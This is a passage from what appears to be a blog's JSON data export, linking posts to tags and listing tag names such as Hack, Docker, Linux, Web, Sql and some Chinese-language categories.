a","_id":"cj2mm9xpp004e5es5ksrxhjuq"},{"post_id":"cj2mm9xpl00415es5elpe3l57","tag_id":"cj2mm9xnj00075es5fi5q8jnj","_id":"cj2mm9xpp004f5es5jcuudy9t"},{"post_id":"cj2mm9xp3002y5es5tshwnecc","tag_id":"cj2mm9xpl003y5es5ds3rnd2l","_id":"cj2mm9xpp004g5es5z4tufq5l"},{"post_id":"cj2mm9xpn00435es54ptyu68i","tag_id":"cj2mm9xo4000w5es5ab5ss9id","_id":"cj2mm9xpp004h5es5u85fdc8d"},{"post_id":"cj2mm9xpe003k5es543abn1fl","tag_id":"cj2mm9xpo00445es5p3mkjc2w","_id":"cj2mm9xpp004i5es597oi5es1"},{"post_id":"cj2mm9xqq004k5es5n5426caf","tag_id":"cj2mm9xo700135es5cjjqdv0l","_id":"cj2mm9xqv004l5es5sz5imjgg"}],"Tag":[{"name":"Hack","_id":"cj2mm9xnj00075es5fi5q8jnj"},{"name":"心情","_id":"cj2mm9xnq000e5es5pgogl54e"},{"name":"Docker","_id":"cj2mm9xo0000q5es59212k2zj"},{"name":"Linux","_id":"cj2mm9xo4000w5es5ab5ss9id"},{"name":"Web","_id":"cj2mm9xo700135es5cjjqdv0l"},{"name":"Github","_id":"cj2mm9xoi001j5es5w234b3zc"},{"name":"github","_id":"cj2mm9xom001q5es5w5iqx8rh"},{"name":"Ops","_id":"cj2mm9xop001y5es5c01b0z3s"},{"name":"Mac","_id":"cj2mm9xos00275es5ah9uieh4"},{"name":"Raspberry","_id":"cj2mm9xox002f5es5lntkfjf0"},{"name":"Sql","_id":"cj2mm9xp2002u5es599kentfm"},{"name":"笑话","_id":"cj2mm9xp500325es5dfuadeta"},{"name":"CodeStyle","_id":"cj2mm9xpe003j5es5e80fxgtw"},{"name":"SQLserver","_id":"cj2mm9xpj003r5es5ao4pui6a"},{"name":"杂谈","_id":"cj2mm9xpl003y5es5ds3rnd2l"},{"name":"其他","_id":"cj2mm9xpo00445es5p3mkjc2w"}]}}